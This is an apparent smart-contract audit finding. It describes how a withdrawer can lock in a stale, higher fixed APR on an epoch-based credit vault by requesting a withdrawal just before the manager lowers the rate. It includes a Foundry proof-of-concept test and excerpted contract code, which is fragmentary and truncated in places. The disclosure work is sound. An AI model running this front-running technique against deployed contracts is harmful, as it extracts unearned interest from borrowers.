### Title
Staged APR changes let withdrawers lock stale fixed-rate yield - (File: `contracts/IdleCDOEpochVariant.sol`)

### Summary
`IdleCreditVault.setApr` lets the honest manager change the fixed APR during the buffer period, while `IdleCDOEpochVariant.requestWithdraw` mints a fixed receipt using the APR current at request time. An attacker can request a withdrawal immediately before a scheduled APR reduction, retain a receipt priced at the old higher APR, and force the borrower to fund that stale amount at the next `stopEpoch`.

### Finding Description
Withdrawal requests are allowed during the buffer phase after an epoch has stopped and before the next epoch starts. `requestWithdraw` calculates projected interest through `_calcInterestWithdrawRequest`, which reads the strategy's currently configured APR through `_calcInterest`, adds that interest to the withdrawal receipt, and then calls `IdleCreditVault.requestWithdraw` to mint an ERC20 receipt for the full amount. [1](#0-0) [2](#0-1) 

The credited APR is not merely informational: the receipt amount is added to `pendingWithdraws`, which the borrower must fund at the next epoch stop through `getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws)` and `collectWithdrawFunds`. [3](#0-2) [4](#0-3) 

However, the manager can directly call `IdleCreditVault.setApr` or `setAprs` at any point, including after a withdrawal request has fixed its interest and before the next epoch begins. [5](#0-4)  `startEpoch` subsequently computes `expectedEpochInterest` from the newly lowered APR, but it does not reprice receipts already added to `pendingWithdraws`. [6](#0-5) 

This creates the same mutable-pricing sandwich surface as the reported `setLsf` issue: the attacker buys or holds tranche tokens, front-runs an APR decrease with `requestWithdraw`, allows the honest manager to lower APR, and later claims a receipt still priced with the obsolete higher APR. The excess is not accounted for in the next epoch's expected interest; it is an additional borrower-funded liability embedded in `pendingWithdraws`. [7](#0-6) 

### Impact Explanation
The borrower pays the attacker interest for the next epoch at a rate that was no longer intended to apply when the epoch started. For example, with 10,000 USDC of receipt principal, a 36.5-day epoch, and an APR change from 20% to 1%, the stale receipt captures approximately 190 USDC more than a request priced after the update, before fees. [8](#0-7) 

The loss scales linearly with attacker-controlled withdrawal principal and with the APR reduction, and large reductions can also create an unexpected borrower funding obligation or trigger default handling if the borrower has not funded or approved the excess. [9](#0-8) 

### Likelihood Explanation
The attacker needs only a KYC-passing wallet and tranche tokens, while the triggering privileged transaction is an ordinary manager APR adjustment rather than malicious behavior. [10](#0-9) [11](#0-10)  The exploit is conditional on an APR decrease occurring during a buffer period after withdrawal requests are enabled, but the withdrawal window is observable and the attack requires no control over privileged accounts. [12](#0-11) 

### Recommendation
Do not allow the strategy APR to change while withdrawal requests for the next epoch can still be created, or atomically bind every withdrawal receipt to the APR that will actually govern the next epoch.

A straightforward fix is to remove direct manager APR updates after CDO initialization and allow APR changes only inside `stopEpoch`/`startEpoch` before withdrawal requests reopen. Alternatively, store the committed next-epoch APR at stop time, prohibit manager changes until the next epoch starts, and use only that immutable value in `_calcInterestWithdrawRequest`.

```solidity
function testAprReductionKeepsStaleWithdrawInterest() external {
    // Remove fees so the assertion isolates the stale APR premium.
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, 0);
    vm.prank(owner);
    cdoEpoch.setIsAYSActive(false);

    uint256 amount = 10_000 * ONE_SCALE;
    uint256 mintedAA = idleCDO.depositAA(amount);
    uint256 sharesPerRequest = mintedAA / 2;
    IdleCreditVault vault = IdleCreditVault(address(strategy));

    // Complete epoch 0 and set the next epoch APR to 20%.
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, 20e18, _expectedFundsEndEpoch());

    uint256 price = cdoEpoch.virtualPrice(address(AAtranche));
    uint256 principalPerRequest = sharesPerRequest * price / ONE_TRANCHE;

    // Attacker front-runs the APR reduction while requests are open.
    uint256 staleReceipt = cdoEpoch.requestWithdraw(
        sharesPerRequest,
        address(AAtranche)
    );

    // Honest manager lowers the APR for the next epoch to 1%.
    vm.prank(manager);
    vault.setAprs(1e18, _scaleAprWithBuffer(1e18));

    // The remaining withdrawal is priced at the new APR.
    uint256 repricedReceipt = cdoEpoch.requestWithdraw(
        IERC20(address(AAtranche)).balanceOf(address(this)),
        address(AAtranche)
    );

    uint256 staleInterest = staleReceipt - principalPerRequest;
    uint256 repricedInterest = repricedReceipt - principalPerRequest;
    assertGt(staleInterest, repricedInterest, "APR reduction did not affect old receipt");

    uint256 expectedPremium = principalPerRequest * 19e18 * cdoEpoch.epochDuration()
        / (365 days * 1e18);
    assertApproxEqRel(
        staleInterest - repricedInterest,
        expectedPremium,
        0.01e18,
        "stale APR premium mismatch"
    );

    // Start the 1% epoch and make the borrower fund active interest plus all receipts.
    _startEpochAndCheckPrices(1);
    uint256 pending = vault.pendingWithdraws();
    uint256 borrowerPayment = cdoEpoch.expectedEpochInterest() + pending;
    deal(defaultUnderlying, borrower, borrowerPayment);

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(1e18, 0);

    uint256 balanceBefore = underlying.balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();

    assertEq(
        underlying.balanceOf(address(this)) - balanceBefore,
        staleReceipt + repricedReceipt,
        "borrower funded stale APR receipt"
    );
}
```

  function _calcInterestWithdrawRequest(uint256 _amount, address _tranche) internal view returns (uint256 _interest, int256 _diff) {
    uint256 _duration = epochDuration;
    if (_duration == 0) {
      return (_interest, _diff);
    }

    uint256 _buffer = bufferPeriod;
    // calculate total vault interest (they don't get the interest for the buffer period for withdraw requests so 
    // we scale it back since _calcInterest is scaling the interest with tht buffer period),
    uint256 totInterest = _calcInterest(_managedContractValue()) * _duration / (_duration + _buffer);
    // calculate total tranche interest for the whole tranche supply
    uint256 totTrancheInterest = _calcTrancheInterestShare(totInterest, _tranche);
    // calculate interest for the given tranche and given amount
    uint256 _trancheBal = _lastSavedNAV(_tranche);
    _interest = _trancheBal == 0 ? 0 : _amount * totTrancheInterest / _trancheBal;
    // calculate the interest that the _amount would have received if there was no split ratio (ie interest split based only on tvl).
    // This is used to calculate the interest that should be added to the expectedEpochInterest when 
    // withdrawing an AA tranche or the interest that should be removed from expectedEpochInterest when
    // withdrawing a BB tranche
    uint256 interestWithoutSplitRatio = _calcInterest(_amount) * _duration / (_duration + _buffer);
    // difference between total interest and tranche interest (positive for AA, negative for BB)
    _diff = int256(interestWithoutSplitRatio) - int256(_interest);

  /// @param _buffer buffer duration
  function setAprsWithBuffer(uint256 _unscaledApr, uint256 _duration, uint256 _buffer) external {
    unscaledApr = _unscaledApr;
    setApr(_duration == 0 ? _unscaledApr : _unscaledApr * (_duration + _buffer) / _duration);

    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();

    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
